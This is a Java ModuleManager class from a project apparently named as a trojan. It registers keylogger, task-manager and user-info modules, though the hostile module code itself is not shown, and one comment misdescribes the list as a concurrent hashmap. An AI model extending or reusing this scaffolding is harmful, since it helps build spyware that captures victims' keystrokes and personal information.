package dev.px.trojan.Manager;

import com.sun.org.apache.xpath.internal.operations.Mod;
import dev.px.trojan.Impl.Modules.KeyLogger.KeyloggerModule;
import dev.px.trojan.Impl.Modules.Module;
import dev.px.trojan.Impl.Modules.TaskManager.TaskManagerModule;
import dev.px.trojan.Impl.Modules.UserInfo.UserInfoModule;

import java.util.ArrayList;
import java.util.HashMap;
import java.util.Map;
import java.util.Objects;
import java.util.concurrent.ConcurrentHashMap;
import java.util.stream.Collectors;

public class ModuleManager {

    private ArrayList<Module> moduleMap;

    public ModuleManager() {
        this.moduleMap = new ArrayList<>(); // We are using a concurrent hashmap so it is safe threaded

        Add(new KeyloggerModule());
        Add(new TaskManagerModule());
        Add(new UserInfoModule());
    }

    public void Add(Module module) {
        this.moduleMap.add(module);
    }

    public void runNoThread() {
        this.moduleMap.forEach(m -> {
            m.runNoThread();
        });
    }

    public <T extends Module> Module getModuleT(Class<T> clazz) {
        return this.moduleMap.stream().filter(m -> m.getClass() == clazz).map(module -> module).findFirst().orElse(null);
    }

    public Module getModuleName(String name) {
        return this.moduleMap.stream().filter(m -> m.getName().equalsIgnoreCase(name)).map(module -> module).findFirst().orElse(null);
    }
    
    public <T extends Module> boolean isModuleActive(Class<T> clazz) {
        return Objects.requireNonNull(this.moduleMap.stream().filter(m -> m.getClass() == clazz).map(m -> m).findFirst().orElse(null)).isActive();
    }

    public ArrayList<Module> getActiveModules() {
        ArrayList<Module> mod = new ArrayList<>();
        this.moduleMap.forEach(m -> {
            if(m.isActive()) {
                mod.add(m);
            } else {
                mod.remove(m);
            }
        });
        return mod;
    }

    static class ModuleRegistry<T extends Module> {

        private Module module;

        private ModuleRegistry(Module clazz) {
            this.module = clazz;
        }

        public Module getModule() {
            return module;
        }

        public ModuleRegistry<T> Build() {
            return this;
        }
    }
}
